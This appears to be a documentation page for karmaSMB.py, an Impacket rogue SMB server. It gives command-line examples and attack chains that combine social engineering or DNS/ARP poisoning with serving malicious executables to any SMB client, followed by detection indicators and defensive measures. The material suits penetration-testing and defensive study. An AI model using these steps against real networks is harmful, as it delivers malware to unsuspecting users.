# karmaSMB.py

## Overview
`karmaSMB.py` is a malicious SMB server tool in the Impacket suite. This tool is categorized under Attack Infrastructure and provides functionality for serving malicious files to any SMB client request regardless of the requested path or filename.

## Detailed Description
KarmaSMB creates a rogue SMB server that will answer any file read request with predefined contents based on file extensions, regardless of the actual sharename or path requested. This makes it extremely useful for payload delivery attacks where you want to serve malicious files to any client that connects.

### Key Features:
- **Universal File Serving**: Serves the same file content for any path/filename requested
- **Extension-based Mapping**: Can serve different files based on requested file extensions
- **SMB1 and SMB2 Support**: Compatible with both SMB protocol versions
- **Configurable Responses**: Uses config files to map extensions to specific files
- **Stealth Operation**: Disguises malicious payloads as legitimate file requests

### Technical Details:
- Implements a malicious SMB server using Impacket's SMB server framework
- Intercepts SMB file read requests and substitutes malicious content
- Supports custom configuration files for extension-to-file mapping
- Works by overriding the normal file serving mechanism in SMB
- Particularly effective for social engineering and payload delivery attacks

## Command Line Options

```
usage: karmaSMB.py [--help] [-config pathname] [-smb2support] [-ts] [-debug] fileName

Required Arguments:
  fileName              Default file contents to serve for all SMB requests

Optional Arguments:
  --help                Show help message and exit
  -config               Config file to map file extensions to specific files
  -smb2support          Enable experimental SMB2 support
  -ts                   Add timestamps to logging output
  -debug                Enable debug output
```

## Usage Examples

### Basic Usage
```bash
# Serve a malicious executable for any file request
python3 karmaSMB.py /path/to/malicious.exe

# Serve a specific file with debug output
python3 karmaSMB.py /tmp/payload.bat -debug

# Enable SMB2 support (experimental)
python3 karmaSMB.py /tmp/malware.exe -smb2support
```

### Advanced Usage with Config File
```bash
# Create config file for extension mapping
echo "exe = /tmp/malicious.exe" > karma.conf
echo "bat = /tmp/malicious.bat" >> karma.conf
echo "doc = /tmp/malicious.doc" >> karma.conf

# Run karmaSMB with extension mapping
python3 karmaSMB.py /tmp/default.txt -config karma.conf

# Run with timestamps and debug
python3 karmaSMB.py /tmp/payload.exe -config karma.conf -ts -debug
```

## Attack Chain Integration

### Social Engineering Payload Delivery
```bash
# Step 1: Create extension-specific config file
echo "exe = /tmp/payload.exe" > karma.conf
echo "bat = /tmp/payload.bat" >> karma.conf  
echo "pdf = /tmp/malicious.pdf" >> karma.conf

# Step 2: Start karmaSMB server
python3 karmaSMB.py /tmp/default.txt -config karma.conf -smb2support -ts

# Step 3: Social engineer targets to access network share
# Target tries to access \\your-server\share\important.exe
# They receive /tmp/payload.exe regardless of what they requested
```

### Network Redirection Attack
```bash
# Step 1: Set up karmaSMB to serve malicious payload
python3 karmaSMB.py /tmp/malicious.exe -config karma.conf -smb2support

# Step 2: Use network poisoning to redirect legitimate requests
# Configure DNS poisoning or ARP spoofing to redirect SMB requests

# Step 3: Any SMB file request will receive the malicious payload
# Target accesses \\server\share\document.docx but receives malicious.exe instead
```

## Prerequisites
- Malicious payload files prepared for delivery
- Network positioning to receive SMB connections
- Understanding of SMB protocol and file serving mechanisms
- Knowledge of target environment and expected file types
- Ability to social engineer or redirect targets to the malicious server

## Detection Considerations
- **Event IDs**: 5140 (Network share accessed), 5145 (Network share checked for access), SMB audit events
- **Network Indicators**: Rogue SMB server responses, unusual SMB traffic patterns
- **Process Indicators**: Unauthorized SMB server processes running on network
- **File Indicators**: Malicious files being served from unexpected locations
- **Registry Indicators**: No direct registry modifications

## Defensive Measures
- Implement network monitoring to detect rogue SMB servers
- Use network access control (NAC) to prevent unauthorized SMB services
- Deploy endpoint detection and response (EDR) tools to identify malicious SMB activity
- Educate users about risks of accessing unknown network shares
- Implement application whitelisting to prevent execution of unknown files

## Common Issues and Troubleshooting

### SMB2 Cache Issues
```bash
# Problem: SMB2 clients may cache directory listings causing issues with multiple requests
# Solution: SMB1 works more reliably, or wait for client cache to clear
python3 karmaSMB.py /tmp/payload.exe -debug
```

### File Access Permissions
```bash
# Problem: Cannot read the file specified for serving
# Solution: Ensure the file exists and is readable
ls -la /tmp/payload.exe
python3 karmaSMB.py /tmp/payload.exe -debug
```

## Related Tools
- [smbserver.py](smbserver.md) - Legitimate SMB server implementation
- [ntlmrelayx.py](ntlmrelayx.md) - NTLM relay attacks, often used in combination
- [responder.py](https://github.com/lgandx/Responder) - Network poisoning tool for credential capture
- [psexec.py](psexec.md) - Lateral movement after credential capture
- [smbclient.py](smbclient.md) - SMB client for testing connections
